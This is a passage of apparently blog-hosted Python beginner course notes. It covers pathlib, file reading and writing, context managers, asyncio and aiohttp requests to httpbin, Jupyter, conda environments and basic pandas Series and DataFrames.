Path.cwd()<br><br>demo_file = Path(Path.joinpath(cwd, <span class="hljs-string">&#x27;demo.txt&#x27;</span>))<br><br><span class="hljs-comment"># Get the file name</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nfile name: &#x27;</span> + demo_file.name)<br><br><span class="hljs-comment"># Get the extension</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nfile suffix: &#x27;</span> + demo_file.suffix)<br><br><span class="hljs-comment"># Get the folder</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nfile folder: &#x27;</span> + demo_file.parent.name)<br><br><span class="hljs-comment"># Get the size</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nfile size: &#x27;</span> + <span class="hljs-built_in">str</span>(demo_file.stat().st_size) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="7、Working-with-files"><a href="#7、Working-with-files" class="headerlink" title="7、Working with files"></a>7、Working with files</h3><p><strong>Opening a file</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">stream = <span class="hljs-built_in">open</span>(file_name, mode, buffer_size)<br><br><span class="hljs-comment"># Modes:</span><br><span class="hljs-comment"># r - Read (default)</span><br><span class="hljs-comment"># w - Truncate and write</span><br><span class="hljs-comment"># a - Append if file exists</span><br><span class="hljs-comment"># x - Write, fail if file exists</span><br><span class="hljs-comment"># + - Updating (read/write)</span><br><br><span class="hljs-comment"># t - Text (default)</span><br><span class="hljs-comment"># b - Binary</span><br></code></pre></td></tr></table></figure><p><strong>Reading from a file</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Open file demo.txt and read the contents</span><br>stream = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./demo.txt&#x27;</span>, <span class="hljs-string">&#x27;rt&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nIs this readable? &#x27;</span> + <span class="hljs-built_in">str</span>(stream.readable()))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nRead one character : &#x27;</span> + stream.read(<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nRead to end of line : &#x27;</span> + stream.readline())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nRead all lines to end of file :\n&#x27;</span> + <span class="hljs-built_in">str</span>(stream.readlines())+ <span class="hljs-string">&#x27;\n&#x27;</span>)<br>stream.close() <span class="hljs-comment"># close the stream</span><br></code></pre></td></tr></table></figure><p><strong>Writing to a file</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Open output.txt as a text file for writing</span><br>stream = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;wt&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nCan I write to this file? &#x27;</span> + <span class="hljs-built_in">str</span>(stream.writable()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>stream.write(<span class="hljs-string">&#x27;H&#x27;</span>) <span class="hljs-comment"># Write a single string </span><br>stream.writelines([<span class="hljs-string">&#x27;ello&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;world&#x27;</span>]) <span class="hljs-comment"># Write one or more strings</span><br>stream.write(<span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># Write a new line</span><br><br>names = [<span class="hljs-string">&#x27;Susan&#x27;</span>,<span class="hljs-string">&#x27;Christopher&#x27;</span>] <span class="hljs-comment"># create a list of strings</span><br>stream.writelines(names) <span class="hljs-comment"># write list of strings </span><br><br><span class="hljs-comment"># Here&#x27;s a neat trick to insert a new line between items in the list</span><br>stream.write(<span class="hljs-string">&#x27;\n&#x27;</span>)  <span class="hljs-comment"># Write a new line</span><br>stream.writelines(<span class="hljs-string">&#x27;\n&#x27;</span>.join(names)) <br>stream.close() <span class="hljs-comment"># Flush stream and close</span><br></code></pre></td></tr></table></figure><p><strong>Managing the stream</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Open manage.txt file to write text</span><br>stream = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;manage.txt&#x27;</span>, <span class="hljs-string">&#x27;wt&#x27;</span>)<br><br><span class="hljs-comment"># Write the word demo to the file stream</span><br>stream.write(<span class="hljs-string">&#x27;demo!&#x27;</span>)<br><br><span class="hljs-comment"># Move back to the start of the file stream</span><br>stream.seek(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># write the word cool to the file stream</span><br>stream.write(<span class="hljs-string">&#x27;cool&#x27;</span>)<br><br><span class="hljs-comment"># Flush the file stream contents to the file buffer</span><br>stream.flush()<br><br><span class="hljs-comment"># Flush the file stream and close the file</span><br>stream.close()<br></code></pre></td></tr></table></figure><h3 id="8、Cleanup-with-with"><a href="#8、Cleanup-with-with" class="headerlink" title="8、Cleanup with with"></a>8、Cleanup with with</h3><p><strong>Writing to a file</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">stream = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;wt&#x27;</span>)<br>stream.write(<span class="hljs-string">&#x27;Lorem ipsum dolar&#x27;</span>)<br>stream.close() <span class="hljs-comment"># THIS IS REALLY IMPORTANT!!</span><br></code></pre></td></tr></table></figure><p><strong>Re-writing with a try/finally</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>stream = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;wt&#x27;</span>)<br>stream.write(<span class="hljs-string">&#x27;Lorem ipsum dolar&#x27;</span>)<br><span class="hljs-keyword">finally</span>:<br>stream.close() <span class="hljs-comment"># THIS IS REALLY IMPORTANT!!</span><br></code></pre></td></tr></table></figure><p><strong>Simplifying with with</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;wt&#x27;</span>) <span class="hljs-keyword">as</span> stream:<br>stream.write(<span class="hljs-string">&#x27;Lorem ipsum dolar&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="9、Asynchronous-operations"><a href="#9、Asynchronous-operations" class="headerlink" title="9、Asynchronous operations"></a>9、Asynchronous operations</h3><p><strong>The waiting is the hardest part</strong></p><ul><li><p>Some operations take a long time</p><ul><li>Web calls</li><li>Network IO</li><li>Complex data processing</li></ul></li><li><p>We don’t want to stop everything just because one process is taking forever</p></li></ul><p><strong>Concurrency and parellelism is a broad topic</strong></p><ul><li><p>All languages offer multiple options for managing long running operations, Python is no exception</p></li><li><p>We’re going to focus on a common scenario - web requests</p></li></ul><p><strong>Synchronous using requests</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> timeit <span class="hljs-keyword">import</span> default_timer<br><br>start_time = default_timer()<br>three = requests.get(<span class="hljs-string">&#x27;https://httpbin.org/delay/3&#x27;</span>).text<br>two = requests.get(<span class="hljs-string">&#x27;https://httpbin.org/delay/2&#x27;</span>).text<br>elapsed_time = default_timer() - start_time<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;The operation took <span class="hljs-subst">&#123;elapsed_time:<span class="hljs-number">.2</span>&#125;</span> seconds&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>Introducing the asyncio module</strong></p><ul><li><p>New in Python 3.4</p><ul><li>Undergoing regular updates</li></ul></li><li><p>“Grafts” asynchronous development into Python</p><ul><li>Streams</li><li>async/await</li><li>Synchronization (locks)</li><li>Exception management</li></ul></li></ul><p><strong>Enabling async with asyncio</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">Operations<br>run <span class="hljs-comment"># Runtime for asynchronous functions</span><br>create_task <span class="hljs-comment"># Creates a handle (or coroutine) and schedules execution</span><br>gather <span class="hljs-comment"># Create a collection of tasks to execute and wait for completion</span><br>Creating coroutines (functions using <span class="hljs-keyword">async</span>/<span class="hljs-keyword">await</span>)<br><span class="hljs-keyword">async</span> <span class="hljs-comment"># Flag to create a coroutine (function with an await call)</span><br><span class="hljs-keyword">await</span> <span class="hljs-comment"># &quot;Pauses&quot; code to wait for response</span><br></code></pre></td></tr></table></figure><p><strong>Running our aiohttp demo</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    start_time = default_timer()<br><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession() <span class="hljs-keyword">as</span> session:<br>        two_task = asyncio.create_task(load_data(session, <span class="hljs-number">2</span>))<br>        three_task = asyncio.create_task(load_data(session, <span class="hljs-number">3</span>))<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Doing other work&#x27;</span>)<br>        two_result = <span class="hljs-keyword">await</span> two_task<br>        three_result = <span class="hljs-keyword">await</span> three_task<br><br>        elapsed_time = default_timer() - start_time<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;The operation took <span class="hljs-subst">&#123;elapsed_time:<span class="hljs-number">.2</span>&#125;</span> seconds&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>Asynchronous using aiohttp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># install aiohttp</span><br><span class="hljs-keyword">import</span> aiohttp<br><span class="hljs-keyword">from</span> timeit <span class="hljs-keyword">import</span> default_timer<br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_data</span>(<span class="hljs-params">session, delay</span>):</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(<span class="hljs-string">f&#x27;https://httpbin.org/delay/<span class="hljs-subst">&#123;delay&#125;</span>&#x27;</span>) <span class="hljs-keyword">as</span> resp:<br>        <span class="hljs-keyword">await</span> resp.text()<br></code></pre></td></tr></table></figure><p><strong>sync_demo.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> timeit <span class="hljs-keyword">import</span> default_timer<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_data</span>(<span class="hljs-params">delay</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Starting <span class="hljs-subst">&#123;delay&#125;</span> second timer&#x27;</span>)<br>    text = requests.get(<span class="hljs-string">f&#x27;http://httpbin.org/delay/<span class="hljs-subst">&#123;delay&#125;</span>&#x27;</span>).text<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Completed <span class="hljs-subst">&#123;delay&#125;</span> second timer&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    start_time = default_timer()<br><br>    two_data = load_data(<span class="hljs-number">2</span>)<br>    three_data = load_data(<span class="hljs-number">3</span>)<br><br>    elapsed_time = default_timer() - start_time<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;The operation took <span class="hljs-subst">&#123;elapsed_time:<span class="hljs-number">.2</span>&#125;</span> seconds&#x27;</span>)<br><br>main()<br></code></pre></td></tr></table></figure><p><strong>async_demo.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Will only run in Python 3.7 or higher</span><br><span class="hljs-keyword">from</span> timeit <span class="hljs-keyword">import</span> default_timer<br><span class="hljs-keyword">import</span> aiohttp<br><span class="hljs-keyword">import</span> asyncio<br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_data</span>(<span class="hljs-params">session, delay</span>):</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Starting <span class="hljs-subst">&#123;delay&#125;</span> second timer&#x27;</span>)<br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(<span class="hljs-string">f&#x27;http://httpbin.org/delay/<span class="hljs-subst">&#123;delay&#125;</span>&#x27;</span>) <span class="hljs-keyword">as</span> resp:<br>        text = <span class="hljs-keyword">await</span> resp.text()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Completed <span class="hljs-subst">&#123;delay&#125;</span> second timer&#x27;</span>)<br>        <span class="hljs-keyword">return</span> text<br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-comment"># Start the timer</span><br>    start_time = default_timer()<br><br>    <span class="hljs-comment"># Creating a single session</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-comment"># Setup our tasks and get them running</span><br>        two_task = asyncio.create_task(load_data(session, <span class="hljs-number">2</span>))<br>        three_task = asyncio.create_task(load_data(session, <span class="hljs-number">3</span>))<br><br>        <span class="hljs-comment"># Simulate other processing</span><br>        <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Doing other work&#x27;</span>)<br><br>        <span class="hljs-comment"># Let&#x27;s go get our values</span><br>        two_result = <span class="hljs-keyword">await</span> two_task<br>        three_result = <span class="hljs-keyword">await</span> three_task<br><br>        <span class="hljs-comment"># Print our results</span><br>        elapsed_time = default_timer() - start_time<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;The operation took <span class="hljs-subst">&#123;elapsed_time:<span class="hljs-number">.2</span>&#125;</span> seconds&#x27;</span>)<br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><h2 id="三、Even-more-python-for-beginners"><a href="#三、Even-more-python-for-beginners" class="headerlink" title="三、Even more python for beginners"></a>三、Even more python for beginners</h2><h3 id="1、Jupyter-Notebooks"><a href="#1、Jupyter-Notebooks" class="headerlink" title="1、Jupyter Notebooks"></a>1、Jupyter Notebooks</h3><p><strong>What are Jupyter notebooks</strong></p><ul><li><p>Open source software</p></li><li><p>Interactive development environment</p></li><li><p>Run inside JupyterLab on your laptop or in the cloud</p></li><li><p>Download JupyterLab from <a href="https://jupyter.org/">jupyter.org</a></p></li></ul><p><strong>Create a notebook to execute your code</strong> </p><p>Select New | Notebook: Python from the upper right hand corner of the toolbar to create a new notebook to execute Python code </p><p><strong>You can upload existing notebooks</strong> </p><p>Select Upload from the top right corner of the toolbar to upload an existing notebook  </p><p><strong>Each notebook has one or more cells</strong> </p><ul><li><p>Use the toolbar to add and move cells </p></li><li><p>When you add a cell select a cell type </p><ul><li>Code – contain the code to execute </li><li>Markdown – Contains descriptive text formatted using Markdown syntax </li><li>Raw NB Convert – is formatted as code but cannot be executed</li></ul></li></ul><p><strong>You can execute your code one cell at a time</strong></p><ul><li><p>Select <strong>Run</strong> from the toolbar to run the code in the current cell</p></li><li><p>Or you can use keyboard shortcuts</p><ul><li><code>CTRL + ENTER</code> runs the code in the current cell</li><li><code>SHIFT + ENTER</code> runs the code in the current cell and moves to the next cell</li></ul></li></ul><p><strong>When you run your code the output appears</strong></p><ul><li>Output appears below the code cell</li><li>If the last line of code in a cell is the name of a variable, Jupyter will display the contents of the variable</li></ul><p><strong>Variables are in scope for the entire notebook</strong></p><ul><li>If you run code in a cell that declares a variable or imports a library, subsequent cells you execute can access that variable or library</li><li>Select restart the kernel from the toolbar to reset the notebook and start executing code in a notebook over from scratch</li></ul><h3 id="2、Anaconda-and-conda"><a href="#2、Anaconda-and-conda" class="headerlink" title="2、Anaconda and conda"></a>2、Anaconda and conda</h3><p><strong>Anaconda is an open source distribution of Python and R for data science</strong></p><p>includes:</p><ul><li><p>more than 1500 packages </p></li><li><p>a graphical interface called Anaconda Navigator</p></li><li><p>a command line interface called Anaconda prompt</p></li><li><p>a tool called <strong>conda</strong></p></li></ul><p><strong>conda is a tool to create and manage python environments</strong></p><p>As you get into more advanced Python coding you will need to install different packages</p><p>When working with tools such as Jupyter notebooks, <a href="https://docs.conda.io/projects/conda/en/latest/index.html">conda</a> may be the simplest way to install libraries so they can be accessed from your notebooks</p><p><strong>After you install Anaconda launch the prompt</strong></p><p><strong>Create a virtual environment with conda</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> conda create --name my_notebook_env python=3.7 –y</span><br><br>--name my_notebook_env: the name of the environment<br>python=3.7: version of python in the environment<br>–y: responds yes automatically to prompts<br></code></pre></td></tr></table></figure><p><strong>Activate your virtual environment</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> conda activate my_notebook_env</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> conda deactivate</span> <br>will deactivate the current active environment<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> conda remove --name my_notebook_env --all</span><br>will permanently delete the virtual environment<br></code></pre></td></tr></table></figure><p><strong>Install library in the active environment</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> conda install pandas</span><br><br>Install jupyter<br><span class="hljs-meta">#</span><span class="bash"> conda install jupyter</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> conda list</span> <br>will return a list of installed libraries<br></code></pre></td></tr></table></figure><p><strong>Launch notebook from the active environment</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">1. Activate your environment<br><span class="hljs-meta">#</span><span class="bash"> conda activate my_notebook_env</span><br>3. Launch Jupyter notebooks<br><span class="hljs-meta">#</span><span class="bash"> jupyter notebook</span><br><br>NOTES: <br>&lt;CTRL&gt;+&lt;C&gt; &lt;CTRL&gt;+&lt;C&gt; will shut down the kernel and bring back the command prompt<br>You may need to deactivate and reactivate your environment before you launch Jupyter notebooks the first time after you install a new package<br></code></pre></td></tr></table></figure><h3 id="3、Pandas"><a href="#3、Pandas" class="headerlink" title="3、Pandas"></a>3、Pandas</h3><p><strong>What is pandas?</strong></p><ul><li><p>Open source/BSD-licensed library </p></li><li><p>High performance and familiar data structures and data analysis tools</p></li><li><p><a href="https://pandas/pydata.org">https://pandas/pydata.org</a></p></li></ul><p><strong>pandas Series is similar to Python list</strong></p><ul><li><p>One dimensional array of objects</p></li><li><p>Each row as an index</p></li><li><p>By default index is zero-based</p></li></ul><div class="table-container"><table><thead><tr><th>index</th><th>value</th></tr></thead><tbody><tr><td>0</td><td>Seattle-Tacoma</td></tr><tr><td>1</td><td>Dulles</td></tr><tr><td>2</td><td>London Heathrow</td></tr><tr><td>3</td><td>Schiphol</td></tr></tbody></table></div><p><strong>Create a new Series</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br>airports = pd.Series([<br>             <span class="hljs-string">&#x27;Seattle-Tacoma&#x27;</span>,<br>             <span class="hljs-string">&#x27;Dulles&#x27;</span>,<br>             <span class="hljs-string">&#x27;London Heathrow&#x27;</span>,<br>             <span class="hljs-string">&#x27;Schiphol&#x27;</span><br>           ])<br></code></pre></td></tr></table></figure><p><strong>Access similar to a list</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># London Heathrow</span><br>airports[<span class="hljs-number">2</span>]<br><br><span class="hljs-comment"># Use a loop to iterate through all the values</span><br><span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> airports:<br>    <span class="hljs-built_in">print</span>(value) <br></code></pre></td></tr></table></figure><p><strong>DataFrame for two dimensional data structures</strong></p><p>Similar to a table in a database or spreadsheet</p><ul><li><p>Coumns identified by name</p></li><li><p>Rows of data</p></li><li><p>Index column</p></li></ul><div class="table-container"><table><thead><tr><th>index</th><th>Name</th><th>City</th><th>Country</th></tr></thead><tbody><tr><td>0</td><td>Seattle-Tacoma</td><td>Seattle</td><td>USA</td></tr><tr><td>1</td><td>Dulles</td><td>Washington</td><td>USA</td></tr><tr><td>2</td><td>London Heathrow</td><td>London</td><td>United Kingdom</td></tr><tr><td>3</td><td>Schiphol</td><td>Amsterdam</td><td>Netherlands</td></tr></tbody></table></div><p><strong>Create a DataFrame</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">airports = pd.DataFrame([<br>   [<span class="hljs-string">&#x27;Seattle-Tacoma&#x27;</span>, <span class="hljs-string">&#x27;Seattle&#x27;</span>, <span class="hljs-string">&#x27;USA&#x27;</span> ],<br>   [<span class="hljs-string">&#x27;Dulles&#x27;</span>, <span class="hljs-string">&#x27;Washington&#x27;</span>, <span class="hljs-string">&#x27;USA&#x27;</span>],<br>   [<span class="hljs-string">&#x27;London Heathrow&#x27;</span>, <span class="hljs-string">&#x27;London&#x27;</span>, <span class="hljs-string">&#x27;United Kingdom&#x27;</span>],<br>   [<span class="hljs-string">&#x27;Schiphol&#x27;</span>, <span class="hljs-string">&#x27;Amsterdam&#x27;</span>, <span class="hljs-string">&#x27;Netherlands&#x27;</span>]<br> ])<br></code></pre></td></tr></table></figure><p><strong>airports:</strong></p><div class="table-container"><table><thead><tr><th>index</th><th>0</th><th>1</th><th>2</th></tr></thead><tbody><tr><td>0</td><td>Seattle-Tacoma</td><td>Seattle</td><td>USA</td></tr><tr><td>1</td><td>Dulles</td><td>Washington</td><td>USA</td></tr><tr><td>2</td><td>London Heathrow</td><td>London</td><td>United Kingdom</td></tr><tr><td>3</td><td>Schiphol</td><td>Amsterdam</td><td>Netherlands</td></tr></tbody></table></div><p><strong>columns parameter to specify column names</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">airports = pd.DataFrame([<br>   [<span class="hljs-string">&#x27;Seattle-Tacoma&#x27;</span>, <span class="hljs-string">&#x27;Seattle&#x27;</span>, <span class="hljs-string">&#x27;USA&#x27;</span> ],<br>   [<span class="hljs-string">&#x27;Dulles&#x27;</span>, <span class="hljs-string">&#x27;Washington&#x27;</span>, <span class="hljs-string">&#x27;USA&#x27;</span>],<br>   [<span class="hljs-string">&#x27;London Heathrow&#x27;</span>, <span class="hljs-string">&#x27;London&#x27;</span>, <span class="hljs-string">&#x27;United Kingdom&#x27;</span>],<br>   [<span class="hljs-string">&#x27;Schiphol&#x27;</span>, <span class="hljs-string">&#x27;Amsterdam&#x27;</span>, <span class="hljs-string">&#x27;Netherlands&#x27;</span>]],<br>   columns= [<span class="hljs-string">&#x27;Name&#x27;</span>,<span class="hljs-string">&#x27;City&#x27;</span>,<span class="hljs-string">&#x27;Country&#x27;</span>]<br>   )<br></code></pre></td></tr></table></figure><p><strong>airports:</strong></p><div class="table-container"><table><thead><tr><th>index</th><th>Name</th><th>City</th><th>Country</th></tr></thead><tbody><tr><td>0</td><td>Seattle-Tacoma</td><td>Seattle</td><td>USA</td></tr><tr><td>1</td><td>Dulles</td><td>Washington</td><td>USA</td></tr><tr><td>2</td><td>London Heathrow</td><td>London</td><td>United Kingdom</td></tr><tr><td>3</td><td>Schiphol</td><td>Amsterdam</td><td>Netherlands</td></tr></tbody></table></div><h3 id="4、Pandas-DataFrame"><a href="#4、Pandas-DataFrame" class="headerlink" title="4、Pandas DataFrame"></a>4、Pandas DataFrame</h3><p><strong>airports:</strong></p><div class="table-container"><table><thead><tr><th>index</th><th>Name</th><th>City</th><th>Country</th></tr></thead><tbody><tr><td>0</td><td>Seattle-Tacoma</td><td>Seattle</td><td>USA</td></tr><tr><td>1</td><td>Dulles</td><td>Washington</td><td>USA</td></tr><tr><td>2</td><td>London Heathrow</td><td>London</td><td>United Kingdom</td></tr><tr><td>3</td><td>Schiphol</td><td>Amsterdam</td><td>Netherlands</td></tr></tbody></table></div><h4 id="1）Examining-pandas-DataFrame-contents"><a href="#1）Examining-pandas-DataFrame-contents" class="headerlink" title="1）Examining pandas DataFrame contents"></a>1）Examining pandas DataFrame contents</h4><p><strong>head</strong> - first <em>n</em> rows</p><p><strong>tail</strong> - last <em>n</em> rows</p><p><strong>shape</strong> - number of rows and columns</p><p><strong>info</strong> - return more 